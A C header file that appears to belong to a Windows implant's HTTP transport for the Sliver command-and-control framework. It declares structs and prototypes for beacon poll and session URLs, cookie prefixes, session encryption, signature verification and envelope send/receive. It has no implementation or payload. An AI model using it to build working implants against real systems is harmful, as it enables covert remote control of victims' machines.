#pragma once

#define MINISIGN_SIZE (74)
#define RAW_SIG_SIZE (2 + 8 + ED25519_SIGNATURE_SIZE)

typedef enum _HttpMethod {
	GET,
	POST,
	PUT,
	DEL,
	HEAD,
	OPTIONS,
	TRCE,
	CONNECT,
	MERGE,
	PATCH,
	HTTP_DELETE
} HttpMethod;

typedef enum _ContentTy
{
	ApplicationAtomXml,
	ApplicationHttp,
	ApplicationJavascript,
	ApplicationJson,
	ApplicationXjson,
	ApplicationOctetstream,
	ApplicationXWwwFormUrlencoded,
	MultipartFormData,
	Boundary,
	FormData,
	ApplicationXjavascript,
	ApplicationXml,
	MessageHttp,
	Text,
	TextJavascript,
	TextJson,
	TextPlain,
	TextPlainUtf16,
	TextPlainUtf16le,
	TextPlainUtf8,
	TextXjavascript,
	TextXjson,
} ContentTy;

typedef enum _HttpHeader
{
	Accept,
	AcceptCharset,
	AcceptEncoding,
	AcceptLanguage,
	AcceptRanges,
	AccessControlAllowOrigin,
	Age,
	Allow,
	Authorization,
	CacheControl,
	Cookie,
	Connection,
	ContentEncoding,
	ContentLanguage,
	ContentLength,
	ContentLocation,
	ContentMd5,
	ContentRange,
	ContentType,
	ContentDisposition,
	Date,
	Etag,
	Expect,
	Expires,
	From,
	Host,
	IfMatch,
	IfModifiedSince,
	IfNoneMatch,
	IfRange,
	IfUnmodifiedSince,
	LastModified,
	Location,
	MaxForwards,
	Pragma,
	ProxyAuthenticate,
	ProxyAuthorization,
	Range,
	Referer,
	RetryAfter,
	Server,
	SetCookie,
	Te,
	Trailer,
	TransferEncoding,
	Upgrade,
	UserAgent,
	Vary,
	Via,
	Warning,
	WwwAuthenticate,
	UpgradeInsecureRequests,
	HeaderEnumEnd
} HttpHeader;

typedef struct _HTTP_REQUEST {
	LPSTR Method;
	LPSTR lpData;
	DWORD cbData;
	DWORD dwResolveTimeout;
	DWORD dwConnectTimeout;
	DWORD dwSendTimeout;
	DWORD dwReceiveTimeout;
	LPSTR Headers[HeaderEnumEnd];
} HTTP_REQUEST, * PHTTP_REQUEST;

typedef struct _HTTP_SESSION {
	HINTERNET hSession;
	BOOL ProxyAutoConfig;
	LPSTR lpProxyAutoConfigUrl;
} HTTP_SESSION, * PHTTP_SESSION;

struct _HTTP_CONFIG {
	PWEB_PROXY pProxyConfig;
	LPSTR lpUserAgent;
	BOOL DisableUpgradeHeader;
	LPSTR lpAccessToken;
	DWORD dwResolveTimeout;
	DWORD dwConnectTimeout;
	DWORD dwSendTimeout;
	DWORD dwReceiveTimeout;
	DWORD dwNumberOfAttemps;
	LPSTR AdditionalHeaders[HeaderEnumEnd];
};

typedef struct _HTTP_CLIENT {
	PURI pUri;
	PHTTP_SESSION pHttpSession;
	HINTERNET hConnection;
} HTTP_CLIENT, * PHTTP_CLIENT;

struct _SLIVER_HTTP_CLIENT {
	PHTTP_CONFIG pHttpConfig;
	PHTTP_CLIENT pHttpClient;
	LPSTR lpHostName;
	DWORD dwPort;
	BOOL UseStandardPort;
	LPSTR PollPaths[66];
	DWORD cPollPaths;
	LPSTR PollFiles[109];
	DWORD cPollFiles;
	LPSTR SessionPaths[99];
	DWORD cSessionPaths;
	LPSTR SessionFiles[100];
	DWORD cSessionFiles;
	LPSTR ClosePaths[57];
	DWORD cClosePaths;
	LPSTR CloseFiles[103];
	DWORD cCloseFiles;
	LPSTR lpPathPrefix;
	DWORD dwMinNumOfSegments;
	DWORD dwMaxNumOfSegments;
	UINT64 uEncoderNonce;
	DWORD dwNetTimeout;
	DWORD dwTlsTimeout;
	DWORD dwPollTimeout;
	DWORD dwPollInterval;
	DWORD dwMaxErrors;
	LPSTR lpCookiePrefix;
};

typedef enum {
	PollType,
	SessionType,
	CloseType
} SegmentType;

typedef struct _HTTP_RESP {
	PBYTE pRespData;
	DWORD cbResp;
	DWORD dwStatusCode;
	HINTERNET hRequest;
} HTTP_RESP, * PHTTP_RESP;

typedef struct _MINISIGN_PUB_KEY {
	UINT16 SignatureAlgorithm;
	BYTE KeyId[8];
	BYTE PublicKey[32];
} MINISIGN_PUB_KEY, * PMINISIGN_PUB_KEY;

PHTTP_CLIENT HttpClientInit
(
	_In_ PURI pUri,
	_In_ PWEB_PROXY pProxyConfig
);

PWINHTTP_PROXY_INFO GetProxyForUrl
(
	_In_ PHTTP_SESSION pHttpSession,
	_In_ PURI pUri
);

HINTERNET SendRequest
(
	_In_ PHTTP_CLIENT This,
	_In_ PHTTP_REQUEST pRequest,
	_In_ LPSTR lpPath,
	_In_ DWORD dwNumberOfAttemps
);

DWORD ReadStatusCode
(
	_In_ HINTERNET hRequest
);

BOOL ReceiveData
(
	_In_ HINTERNET hRequest,
	_Out_ PBYTE* pData,
	_Out_ PDWORD pdwDataSize
);

VOID FreeHttpSession
(
	_In_ PHTTP_SESSION pHttpSession
);

VOID FreeHttpClient
(
	_In_ PHTTP_CLIENT pHttpClient
);

VOID FreeHttpRequest
(
	_In_ PHTTP_REQUEST pHttpReq
);

LPSTR GetContentTypeString
(
	_In_ ContentTy ContentTypeEnum
);

PHTTP_RESP SendHttpRequest
(
	_In_ PHTTP_CONFIG pHttpConfig,
	_In_ PHTTP_CLIENT pHttpClient,
	_In_ LPWSTR lpPath,
	_In_ LPSTR Method,
	_In_ LPSTR lpContentType,
	_In_ LPSTR lpData,
	_In_ DWORD cbData,
	_In_ BOOL SetAuthorizationHeader,
	_In_ BOOL GetRespData
);

VOID FreeHttpResp
(
	_In_ PHTTP_RESP pResp
);

LPSTR SliverBase64Encode
(
	_In_ PBYTE lpInput,
	_In_ DWORD cbInput
);

PMINISIGN_PUB_KEY DecodeMinisignPublicKey
(
	_In_ LPSTR lpInput
);

PBYTE SessionEncrypt
(
	_In_ PSLIVER_HTTP_CLIENT pClient,
	_In_ PBYTE pMessage,
	_In_ DWORD cbMessage,
	_Out_ PDWORD pcbCipherText
);

BOOL VerifySign
(
	_In_ PMINISIGN_PUB_KEY pPubKey,
	_In_ PBYTE pMessage,
	_In_ DWORD cbMessage,
	_In_ BOOL IsHashed
);

PHTTP_REQUEST CreateHttpRequest
(
	_In_ PHTTP_CONFIG pHttpConfig,
	_In_ LPSTR Method,
	_In_ LPSTR lpData,
	_In_ DWORD cbData
);

VOID FreeSliverHttpClient
(
	_In_ PSLIVER_HTTP_CLIENT pClient
);

LPSTR StartSessionURL
(
	_In_ PSLIVER_HTTP_CLIENT pClient
);

LPSTR ParseSegmentsUrl
(
	_In_ PSLIVER_HTTP_CLIENT pClient,
	_In_ SegmentType SegmentType
);

LPSTR CreatePollURL
(
	_In_ PSLIVER_HTTP_CLIENT pClient
);

LPSTR CreateSessionURL
(
	_In_ PSLIVER_HTTP_CLIENT pClient
);

PSLIVER_HTTP_CLIENT HttpInit();

BOOL HttpStart
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_HTTP_CLIENT pHttpClient
);

PENVELOPE HttpRecv
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_HTTP_CLIENT pHttpClient
);

BOOL HttpSend
(
	_In_ PGLOBAL_CONFIG pConfig,
	_In_ PSLIVER_HTTP_CLIENT pHttpClient,
	_In_ PENVELOPE pEnvelope
);

BOOL HttpCleanup
(
	_In_ PSLIVER_HTTP_CLIENT pSliverHttpClient
);

BOOL HttpClose
(
	_In_ PSLIVER_HTTP_CLIENT pSliverHttpClient
);